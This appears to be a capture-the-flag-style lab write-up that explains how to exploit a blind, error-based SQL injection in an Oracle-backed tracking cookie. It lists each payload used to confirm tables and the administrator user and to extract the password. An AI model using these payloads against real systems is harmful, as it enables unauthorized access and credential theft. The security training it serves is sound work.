# Lab: Blind SQL injection with conditional errors
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Conditional errors
In the lab before we had a message that was shown if the injected statement was true and not if it was false. Now we don't have such an indicator, but the applaction shows an error message caused by the query. So we can craft the injected statement in that way, that it runs into an error if the condition is true, but not if the condition is false.

The SQL query of the application probably looks again like the following:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '2Dea5evkp3l2nR4B'
```

From the hint we know that the database is an Oracle DB.

For verifying, that there is an error message from the database we inject the content `TrackingId=2Dea5evkp3l2nR4B'` and it shows an _Internal Server Error_. If we inject a double tick at the end (`TrackingId=2Dea5evkp3l2nR4B''`) there is no error anymore.

To verify, that these are errors created by SQL we can use
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT NULL)||'
```
to provoke an error and
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT NULL FROM dual)||'
```
to confirm, that the error came from the bad syntax. This also approves, that the application uses an Oracle database, because the first query is a valid MySQL statement. Oracle needs always a `FROM` part.

To ensure an internal SQL error, we can just adress an invalid table:
```
2Dea5evkp3l2nR4B'||(SELECT NULL FROM test)||'
```
This shows also an error and tells us that the query is processed by the back-end.

## Solution
At this point we can abuse the error message as discussed before.

### Information gathering
#### Users table
First we have to confirm, that there is a table called 'users'. To do so we can adjust the statement from before to the following:
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT NULL FROM users WHERE ROWNUM=1)||'
```
_Keep in mind, that `TrackingId=2Dea5evkp3l2nR4B'||(SELECT NULL FROM users)||'` would also cause an error. For that we are using the `WHERE ROWNUM=1` part._

#### Administrator user
The next step is to confirm, that there is an user called 'administrator' in that table. For that we can use the following query:
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

This query will create an error and confirms that the user exists. The reason for this is that the part after the `FROM` is executed before `SELECT` in SQL. If this part delivers some data the `SELECT`, and with that the `CASE`, is executed. `(1=1)` is always true, so the the `TO_CHAR(1/0)` will be executed and the query runs into an error. If the `FROM` part doesn't give any data back, for example if the user 'administrator' doesn't exist, the `SELECT` part won't be executed and the query creates no error.

#### Password length
Further on we have to determine the length of the password of the administrator user. For that we can use the followoing statement and increase the length in the condition. If the condition is true, the application will throw an error.
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Increasing the number, will show that the password is 20 characters long. The site gives no error for that value.

_In the lab before ([Blind SQL injection with conditional responses](Blind_SQL_injection_with_conditional_responses.md)) we used Burp Intruder to automate this task. Take a look in the writeup to se the configuration for Intruder._

#### Password character
At last we have to brute force the characters of the password. For that we slightly adjust the query from before. For every character we have to test our set ([0-9] and [a-z]).

We check the first character of the password with
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

and the second with
```
TrackingId=2Dea5evkp3l2nR4B'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
and so on.

If we got a hit, the application throws an error.

Iterating through this will give us the password: `tooxx10lyarn3etz8y7l`

_In the lab before ([Blind SQL injection with conditional responses](Blind_SQL_injection_with_conditional_responses.md)) we used Burp Intruder to automate this task. Take a look in the writeup to se the configuration for Intruder._


If we login with the user 'administrator' and the found password, the lab is solved!
